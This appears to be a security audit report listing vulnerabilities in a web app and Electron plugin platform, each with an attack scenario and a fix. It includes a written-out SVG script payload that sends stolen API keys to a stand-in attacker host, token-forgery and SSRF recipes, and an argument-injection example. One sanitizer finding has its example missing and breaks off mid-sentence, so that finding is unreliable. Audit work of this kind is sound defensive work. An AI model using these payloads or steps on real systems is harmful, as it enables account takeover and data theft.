title: Committed apps/nexus/.env ships a known AUTH_SECRET that signs app JWTs
summary: apps/nexus/.env is tracked in git (not gitignored) and contains AUTH_SECRET=dev-secret-change-me. Nuxt auto-loads .env from the app root, nuxt.config.ts:73 reads process.env.AUTH_SECRET, and utils/auth.ts falls back to it as the HMAC key for app tokens. assertRuntimeCredential does not reject the value.
failure_scenario: The secret is public in the repository. On any deployment that picks up the repo .env (self-host, docker build, CI/preview, a node/nitro target rather than Cloudflare bindings), getAppJwtSecret returns 'dev-secret-change-me'. An attacker mints their own token with createAppToken's exact format -- HS256 over base64url({alg,typ}).{sub:<victim userId>,iss:'tuff-nexus',aud:'tuff-app',typ:'app',exp:<future>} -- and sends it as Authorization: Bearer. verifyAppToken (auth.ts:246-288) recomputes the same HMAC, timingSafeEqual passes, and requireAppAuth returns that userId. Full account takeover for any user id, including admins. The guard does not catch it: assertRuntimeCredential only rejects values under 16 chars, values in LOCAL_ONLY_CREDENTIAL_VALUES, or values matching DOCUMENTED_PLACEHOLDER_PATTERNS, which are anchored at string start (/^change[-_ ]?me.../); 'dev-secret-change-me' is 20 chars and matches none. nuxt.config.ts:269 reuses the same authSecret as the release-download signing fallback, so signed download URLs are forgeable too.
recommendation: Delete apps/nexus/.env from git history, add it to .gitignore, rotate AUTH_SECRET, and add the value to LOCAL_ONLY_CREDENTIAL_VALUES so it can never be used outside local dev.

title: Subscription activation codes generated with Math.random(), not a CSPRNG
summary: generateActivationCode builds paid-plan activation codes from Math.random(), a non-cryptographic PRNG, even though the same file already imports randomUUID.
failure_scenario: Math.random() is V8's xorshift128+, seeded per isolate and fully reconstructable: an attacker who legitimately obtains a small number of codes issued by the same worker isolate (e.g. buys or is granted a few) can solve for the internal PRNG state and then generate the codes issued before and after theirs. The recovered code is POSTed to /api/subscription/activate, which passes it straight to activateCode (api/subscription/activate.post.ts:14), granting a paid plan the attacker never paid for. The plan prefix is not secret -- it is embedded in the code as `TUFF-${plan}-` -- so the attacker can target PLUS/TEAM/ENTERPRISE codes specifically.
recommendation: Generate the code from crypto.getRandomValues / randomUUID (already imported in this file) and reject codes after a small number of failed activation attempts.

title: Team invite codes generated with Math.random(), only 8 chars of predictable entropy
summary: generateInviteCode produces team invite codes from Math.random() over a 32-char alphabet. Invite codes are the bearer credential for joining a team.
failure_scenario: An attacker creates their own team to harvest invite codes generated by the same worker isolate, recovers the Math.random() xorshift128+ state from those outputs, and predicts invite codes minted for other organizations. The predicted code is submitted to /api/team/join (api/team/join.post.ts) or read via /api/team/invite/[code], joining the attacker to a team they were never invited to and giving them access to that team's shared quota, member list and team-scoped resources. Unlike the activation code there is no plan prefix to guess and the code is only 8 characters, so even blind guessing is far cheaper than a 128-bit token.
recommendation: Use crypto.getRandomValues for invite codes, lengthen them, and rate-limit /api/team/join per account and per IP.

title: Plugin config storage enforces a per-file cap but no per-plugin total quota
summary: savePluginFile checks that a single config file is under 10MB but never checks the plugin's aggregate footprint, so the documented '10MB limit per plugin' is not enforced. getStorageStats computes totalSize against the same 10MB constant but is reporting-only.
failure_scenario: A malicious or buggy plugin calls the storage set-item API in a loop with distinct file names (config1.json, config2.json, ...). Each write is individually under 10MB so every check passes, and there is no cap on file count or total bytes, so the plugin writes unbounded data into the user's config directory until the disk fills. The correct pattern already exists elsewhere in the same codebase: apps/core-app/src/main/modules/plugin/host/plugin-business-file-storage.ts:127 enforces `if (projectedCount > MAX_FILES || totalBytes + nextBytes > MAX_TOTAL_BYTES)`, so the config path is the outlier.
recommendation: Mirror plugin-business-file-storage.ts: track file count and cumulative bytes per plugin and reject writes that would exceed MAX_FILES / MAX_TOTAL_BYTES.

title: tpex manifest _signature is an unkeyed MD5 of the file map, providing no authenticity
summary: verifyManifestIntegrity treats manifest._signature as a trust signal, but generateSignature is an unkeyed MD5 over the _files map that anyone repacking the archive can recompute.
failure_scenario: An attacker who can supply a .tpex package modifies plugin files, recomputes each file's sha256 into manifest._files, then recomputes the MD5 over that map and writes it to manifest._signature. verifyManifestIntegrity passes because the check only proves _signature is self-consistent with _files -- no secret and no publisher key is involved -- so the field carries no authenticity despite its name. The per-file sha256 comparison is likewise self-referential against the attacker-supplied manifest. Real publisher authenticity depends entirely on the separate publisher_signature path (utils/pluginSigning.ts); any code path or reviewer that treats a passing _signature as evidence of provenance is relying on a control that does not exist. MD5 is additionally collision-broken and should not appear in a field named _signature.
recommendation: Rename the field to make its checksum-only role explicit, switch the digest to SHA-256, and ensure admission decisions depend only on the keyed publisher signature.

title: Plugin signing canonical JSON sorts keys with localeCompare, so it is not deterministic
summary: canonicalize() orders object keys with localeCompare(left, right, 'en') instead of a codepoint sort. This canonical form is the exact byte string that gets signed and verified across three different JS runtimes.
failure_scenario: serializePluginSigningValue feeds three runtimes with different ICU collation data: the publisher CLI signs via packages/tuff-cli-core/src/plugin-signer.ts:150, Nexus verifies on Cloudflare Workers via apps/nexus/server/utils/pluginSigning.ts:438, and the Electron main process verifies via apps/core-app/src/main/modules/plugin/signature-verifier.ts:242. localeCompare is ICU/locale-data dependent (Node small-icu vs full-icu vs the Workers runtime), so the same object can serialize to different byte strings on signer and verifier, producing spurious signature failures. Worse, ICU collation returns 0 for distinct strings that differ only by collation-ignorable code points (e.g. a soft hyphen U+00AD or ZWJ U+200D inside a path); when the comparator returns 0, Array.prototype.sort leaves those keys in input order, which for serializePluginFileMap comes from attacker-chosen tar entry ordering. A publisher can therefore craft plugin file names whose canonical serialization -- and thus the signed fileMapSha256 -- is not a function of the file map alone.
recommendation: Sort with a plain codepoint comparator (left < right ? -1 : left > right ? 1 : 0) and reject duplicate keys, so canonicalization is byte-deterministic on every runtime.

title: OAuth sign-in links to an existing account by email alone, without checking email_verified
summary: The next-auth signIn callback merges an incoming OAuth identity into an existing local account whenever the provider-supplied email matches, with no verification that the provider actually validated that address.
failure_scenario: An attacker sets the email address on their account at a federated provider (the custom 'linuxdo' provider at LINUXDO_ISSUER=https://connect.linux.do, whose profile mapper reads profile.email with no email_verified check) to the address of a Tuff user they want to take over. They then click 'Sign in with LinuxDo'. getUserByAccount finds no prior link, so control falls through to the email branch: getUserByEmail returns the victim's account and signIn returns true, so the attacker receives a session bound to the victim's user id. No password, no email confirmation, and no prior link between the two identities is required. utils/auth.ts:54-71 (resolveSessionUserByEmail) compounds this by auto-provisioning any unmatched session email with emailState: 'verified' and emailVerified set to the current time.
recommendation: Only auto-link when the provider asserts a verified address (check profile.email_verified per provider) and the local account's email is already verified; otherwise require an explicit, authenticated link step.

title: Any publisher can store an SVG plugin icon that is served as image/svg+xml on the app origin
summary: Plugin icon upload is reachable with the non-admin plugin:publish scope and inherits the default allow-list that includes svg. The public image endpoint then echoes the stored content type with no X-Content-Type-Options and no Content-Disposition.
failure_scenario: plugin:publish is not an admin-only scope -- ADMIN_ONLY_SCOPE_PREFIXES in utils/apiKeyScopes.ts:21 is ['plugin:moderate', 'release:', 'maintenance:'] and plugin:publish is in DEFAULT_PLUGIN_API_KEY_SCOPES -- so any registered user can create an API key with it. That user POSTs a plugin to /api/dashboard/plugins with an 'icon' form file containing an SVG whose body is <svg xmlns="http://www.w3.org/2000/svg"><script>fetch('/api/dashboard/api-keys').then(r=>r.text()).then(t=>fetch('//attacker/'+btoa(t)))</script></svg>. uploadImage accepts it (image/* and the svg extension are both allowed) and returns a key. Any visitor who loads /api/images/<key> as a top-level document gets Content-Type: image/svg+xml with no nosniff and no attachment disposition, so the browser renders the SVG as an active document on the Nexus origin and the script runs same-origin against the victim's dashboard session. X-Content-Type-Options: nosniff appears nowhere in the repository, and sibling download routes such as api/plugins/assets/[key].get.ts:65 do set Content-Disposition: attachment, so this endpoint is the outlier.
recommendation: Drop svg from the upload allow-list (or sanitize/rasterize it), and on every user-content response set X-Content-Type-Options: nosniff plus Content-Disposition: attachment, or serve user content from a separate origin.

title: Password sign-in has no lockout, throttle or captcha; failures are logged but never counted
summary: The credentials provider records each failed password attempt via logLoginAttempt but never reads that history back, and no rate limiter or Turnstile check guards the sign-in path.
failure_scenario: An attacker POSTs to the credentials callback in a loop with a fixed victim email and a password list. Each miss calls logLoginAttempt and returns null, but nothing ever queries the login-attempt table to count recent failures, so the attempt budget is unbounded and the account is never locked or delayed. The project already has the pieces it needs and simply does not apply them here: enforceAdminRateLimit (utils/adminRateLimitStore.ts) guards api/admin/emergency/*, evaluateDeviceAuthRateLimit guards api/app-auth/device/approve.post.ts, and verifyTurnstileToken (utils/turnstile.ts) is wired into api/auth/register.post.ts:24 -- but sign-in has none of the three. PBKDF2 at 210k iterations raises per-guess cost but does not bound the number of guesses.
recommendation: Count recent failures per account and per IP from the existing login-attempt table and apply progressive delay plus lockout, and require Turnstile on sign-in after the first failure.

title: Scene asset download performs no ownership check on the requested key
summary: The route authenticates the caller but never ties the requested asset key to that caller, and the storage helper it delegates to fetches purely by key.
failure_scenario: Any authenticated user -- requireAuthOrApiKey is called with no required scopes, so the lowest-privilege API key qualifies -- can request any scene asset key and receive its bytes, because authorization ends at 'is someone logged in'. Scene run outputs can contain another tenant's uploaded images and model results. Exposure is currently bounded only by key secrecy, since sceneOrchestrator.ts:1752 builds the key as `scene_run_${randomUUID()}`; that makes the URL a bearer capability, so any key that leaks through logs, a Referer header, a support ticket or a shared link grants permanent cross-tenant read with no way to scope it back to its owner.
recommendation: Record the owning user/team when the asset is stored and require it to match the caller in requireSceneAsset, rather than relying on key entropy.

title: Webhook notification URL is used unvalidated while the sibling relay path enforces https
summary: Webhook credentials store an arbitrary url string with only a length check, and the dispatcher passes it straight to the HTTP client, unlike readHttpsRelayEndpoint in the same file which rejects non-https destinations.
failure_scenario: storeNotificationCredential accepts any non-empty string under 2048 chars as the webhook url -- no URL parse, no scheme check, no host allow-list. An admin (or anyone who reaches api/dashboard/notifications/credentials.post.ts through a compromised admin session or CSRF) sets url to http://169.254.169.254/latest/meta-data/ or an internal address, and every dispatched notification makes the server issue that request; validateStatus accepts every status 100-599, so the delivery record reflects the response code and acts as a probe oracle. Because plain http is permitted, the notification body and the X-Tuff-Signature HMAC also travel in cleartext to whatever host is configured.
recommendation: Parse and validate the webhook URL at write time with the same rule readHttpsRelayEndpoint already applies (https only, or http for loopback in dev), and reject private/link-local hosts.

title: Regex markdown sanitizer is bypassable; plugin README reaches v-html in the Electron renderer
summary: sanitizeMarkdownHtml strips dangerous elements and then attributes in separate sequential .replace() passes. Removing an attribute in a later pass can splice a tag or event handler back together, and the result is injected with v-html.
failure_scenario: The passes run in sequence over each other's output, so text that is not a handler when the on-pass runs can become one after the style-pass deletes the attribute between the halves. Executing the exact regex chain from this file confirms it: input produces output . The src survives because isAllowedUrl accepts any value starting with '/', it 404s, and onerror fires. The same splice yields
recommendation: Replace the regex chain with a real parser-based sanitizer (DOMPurify on the client, or a parse-and-serialize allow-list), since sequential regex passes cannot be made safe.

title: Telemetry ingestion trusts a client-supplied userId with no authentication
summary: The telemetry endpoints are unauthenticated (IP guard only) yet accept userId straight from the request body and persist it as the event's owner.
failure_scenario: There is no requireAuth on this route and nothing binds the body's userId to a session or token, so anyone on the internet can POST {eventType:'search', userId:'<victim id>', searchQuery:'...'} and have it stored as that user's activity. The same pattern repeats in api/telemetry/batch.post.ts:43 at up to 100 events per request. An attacker can fabricate another user's search history and device fingerprints, which then surface in the per-user view at api/dashboard/telemetry/me.get.ts and in admin analytics, corrupting abuse investigations and any usage-derived decision. It also lets an attacker plant chosen strings into records attributed to a specific person.
recommendation: Derive userId from the authenticated session or app token and ignore any userId in the body; keep anonymous events tied to clientId only.

title: Renderer-supplied metadata.trusted suppresses the main-process plugin install confirmation
summary: The install queue treats a boolean sent by the renderer as proof that the user already approved the install, so the main-process consent prompt is skipped on the client's say-so.
failure_scenario: Any code running in the renderer emits PluginEvents.install.source with {source:'<attacker url or path>', metadata:{trusted:true}}. trustedHint becomes true, needsConfirmation evaluates false, and the plugin installs with no user-visible prompt. Signature verification does not compensate: at install-queue.ts:194-205 requiresRegistryTrust is only set when providerResult.official is true or sourceType === 'registry', so for a non-registry source with no trust metadata the verifyPluginPackageTrust call is skipped entirely. The neighbouring officialActual field shows the intended pattern -- it is recomputed in the main process at line 187 from prepared.providerResult.official rather than taken from the client -- and trustedHint is the one that was left client-authoritative. This chains directly with the plugin-README sanitizer bypass in packages/utils/renderer/shared/markdown-sanitizer.ts, whose payload executes in this very renderer on the store detail overlay: viewing a malicious plugin listing becomes a silent install of arbitrary plugin code.
recommendation: Delete trustedHint from the skip condition and require the main process to have shown and received its own confirmation; treat all renderer-supplied metadata as untrusted hints only.

title: Search text is passed as the first argv to Everything es.exe, allowing option injection
summary: The raw query string is placed in argv[0] of the Everything CLI with no leading -- separator, so a query beginning with a dash is parsed as a CLI switch rather than as search text.
evidence:
const { stdout } = await this.exec(
      esPath,
      [
        query,
        '-n',
        String(maxResults),
        '-sort',
        'path',
        '-full-path-and-name',
        '-size',
        '-dm',
        '-dc',
        '-csv',
        '-no-header'
      ],
      { timeout: 5000, maxBuffer: 10 * 1024 * 1024, signal, windowsHide: true }
    )
failure_scenario: query reaches this call unmodified from the CoreBox search field via everything-provider.ts:1591. es.exe interprets any argument starting with '-' as an option, so a query such as '-export-csv C:\\Users\\Public\\out.csv' is consumed as the export switch and writes an attacker-chosen file containing index contents instead of performing a search; other switches (-r for regex, -path) similarly change behaviour. This is argument injection rather than shell injection -- this.exec resolves to promisified execFile with an args array, so no shell metacharacters are interpreted -- but the option surface is still reachable. Impact is bounded because the query normally originates from the local user typing in their own launcher; it matters when a query is supplied programmatically, for example by a plugin or a recommendation flow that forwards text it did not author.
recommendation: Insert a '--' end-of-options separator before query, or reject/escape leading dashes before building the argv array.

title: One matching recovery code releases every device keyring, with no attempt limit
summary: recoverKeyrings verifies the submitted recovery code against each device's stored hash, but on the first match it returns every row for the user rather than the matching device's keyring, and nothing counts failed attempts.
failure_scenario: The success path maps over rows, not candidates, so proving knowledge of a single device's recovery code hands back the encrypted keyrings of every device the user owns, including devices whose recovery_code_hash is different or null. One recovery code written down, screenshotted or leaked from a single old device therefore compromises the whole fleet's key material rather than that one device. Separately, nothing bounds guessing: api/v1/keys/recover-device.post.ts calls recoverKeyrings on every request with no counter, no lockout and no enforceAdminRateLimit-style guard, so a caller holding an app token for the account can submit recovery codes indefinitely. The step-up in that route does not compensate either -- requireStepUpIfPasskeyEnabled (recover-device.post.ts:12-19) returns early and demands nothing when the device is already trusted or when the user has registered no passkeys.
recommendation: Return only the keyring whose recovery code matched, and rate-limit plus lock out repeated recovery attempts per user and device.
